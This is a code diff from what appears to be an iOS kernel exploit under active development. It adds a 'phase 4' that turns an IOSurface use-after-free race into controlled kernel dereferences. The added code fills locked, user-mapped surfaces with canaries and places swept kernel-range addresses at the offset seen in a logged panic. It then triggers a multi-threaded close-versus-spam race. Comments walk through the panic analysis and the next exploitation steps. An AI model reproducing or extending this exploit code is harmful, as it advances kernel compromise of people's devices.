@@ -75,6 +75,9 @@ typedef struct __IOSurface *IOSurfaceRef_;
 extern IOSurfaceRef_ IOSurfaceCreate(CFDictionaryRef dictionary);
 extern uint32_t IOSurfaceGetID(IOSurfaceRef_ buffer);
 extern void IOSurfaceSetValue(IOSurfaceRef_, CFStringRef, CFTypeRef);
+extern int IOSurfaceLock(IOSurfaceRef_ buffer, uint32_t options, uint32_t *seed);
+extern int IOSurfaceUnlock(IOSurfaceRef_ buffer, uint32_t options, uint32_t *seed);
+extern void *IOSurfaceGetBaseAddress(IOSurfaceRef_ buffer);
 
 #define L(...)  AvePost(S(__VA_ARGS__))
 // L2 = same, but let the network mirror actually flush (a panic later in the
@@ -1617,6 +1620,101 @@ static void p2_unit(int u, int round) {
     for (int i = 0; i < nconn && i < 8; i++) if (have[i]) IOServiceClose(cs[i]);
     dropPort(wp);
     p2Done();      // this round survived: the next resume starts after it
+}
+
+// ---------------------------------------------------------------------------
+// Phase 4 - the surface deref control (from panic-full-2026-11-21-092650).
+// That panic: SAME fault instruction as the three before it (sel17 dispatch,
+// pc+0x72418) but far = x0+8 where x0 = 0x7204459e0 - a USERSPACE address, hit
+// during V_SURFCH (surface churn) with a released surface mid-race.  So the
+// object the handler reads at +8 is reached through a pointer that this race
+// leaves stale, and the pointer is NOT a kernel address - it points at the
+// app's own mapping of IOSurface memory.  While the mapping is live the kernel
+// reads OUR bytes; whatever it does with the value it read is then steerable.
+//
+// Phase 4:
+//   S1 create K churn-shaped surfaces, LOCK them (mapping stays alive), fill
+//      every qword with a distinct canary so a panic can name the offset and
+//      the surface (its base address is logged)
+//   S2 qword +8 - the observed deref offset - carries the sweep target, a
+//      kernel-range address; if the kernel uses the value as a pointer the
+//      next panic's far NAMES our target = controlled kernel dereference
+//   S3 run the V_SURFCH close-vs-spam shape with the mappings alive
+//   S4 KCE first (the fixed escape) - a panic must not eat the kernelcache
+// ---------------------------------------------------------------------------
+static const uint64_t P4_TARGETS[] = {
+    0xfffffff007044000ull, 0xfffffff007044100ull, 0xfffffff007044200ull,
+    0xfffffff007044400ull, 0xfffffff007044800ull,
+};
+static const int P4_NT = (int)(sizeof P4_TARGETS / sizeof P4_TARGETS[0]);
+
+static void p4_fill(IOSurfaceRef_ s, uint32_t tag, uint64_t target) {
+    if (!s || !IOSurfaceLock || !IOSurfaceGetBaseAddress) return;
+    uint32_t seed = 0;
+    if (IOSurfaceLock(s, 0, &seed) != 0) return;
+    void *base = IOSurfaceGetBaseAddress(s);
+    if (base) {
+        uint64_t *q = (uint64_t *)base;
+        size_t nq = 64 / 8;                       // the 64x4x4BPE shape = 1KB
+        for (size_t k = 0; k < nq; k++)
+            q[k] = 0xC0FFEE5A00000000ull | (((uint64_t)(0x53) & 0xffff) << 16) | (tag * 256 + (uint32_t)k);
+        q[1] = target;                            // +8: the deref offset
+        EV("[uaf][P4] surface tag=%u base=%p [+8]=%#llx q[0]=%#llx",
+           tag, base, (unsigned long long)target, (unsigned long long)q[0]);
+    }
+    if (IOSurfaceUnlock) (void)IOSurfaceUnlock(s, 1, &seed);
+}
+
+static void p4_unit(int round) {
+    uint64_t target = P4_TARGETS[round % P4_NT];
+    int K = 8;
+    IOSurfaceRef_ s[8];
+    for (int i = 0; i < K; i++) {
+        s[i] = mkSurface();                       // 64x4x4BPE, the churn shape
+        if (s[i]) p4_fill(s[i], (uint32_t)round, target);
+    }
+    p2Save();
+
+    io_connect_t c = 0; mach_port_t wp = newWakePort();
+    uint64_t in[3] = {1, 2, 3};
+    if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) == KERN_SUCCESS) {
+        callSel(c, SEL_REG, in, 24, 1, wp);
+        gSpamConn = c; gSpamShape = 1; gSpamRun = 1; gSpamCount = 0;
+        pthread_t th[4];
+        for (int i = 0; i < 4; i++) pthread_create(&th[i], NULL, spamReg, NULL);
+        // the churn: create/release surfaces that are NOT ours, while our
+        // mapped canaries stay alive
+        for (int i = 0; i < 24; i++) {
+            IOSurfaceRef_ t = mkSurface();
+            if (t) CFRelease(t);
+            usleep(2000);
+        }
+        IOServiceClose(c);                        // the free window
+        usleep(5000);
+        gSpamRun = 0;
+        for (int i = 0; i < 4; i++) pthread_join(th[i], NULL);
+        EV("[uaf][P4] unit=%d round=%d survived (spam=%llu, target=%#llx)",
+           round, (unsigned long long)gSpamCount, (unsigned long long)target);
+    }
+    for (int i = 0; i < K; i++) if (s[i]) CFRelease(s[i]);
+    dropPort(wp);
+    p2Done();
+}
+
+NSString *ModIsurfUAF3(void) {
+    p2Load();
+    if (!g_ev) g_ev = fopen(g_evpath, "a");
+    stageKCE();
+    AveSetStatus(@"112477 phase 4: surface deref control");
+    if (!gSvc && findService() != 0) return @"112477 P4: no IOSurface service";
+    int ran = 0;
+    for (int r = 0; r < 8 && ran < 3; r++, p2Round++) {
+        EV("[uaf][P4] ---- round %d (target sweep %#llx) ----",
+           p2Round, (unsigned long long)P4_TARGETS[p2Round % P4_NT]);
+        p4_unit(p2Round);
+        ran++;
+    }
+    return S(@"112477 P4: %d rounds survived (canary at +8, mappings held live)", ran);
 }
 
 NSString *ModIsurfUAF2(void) {
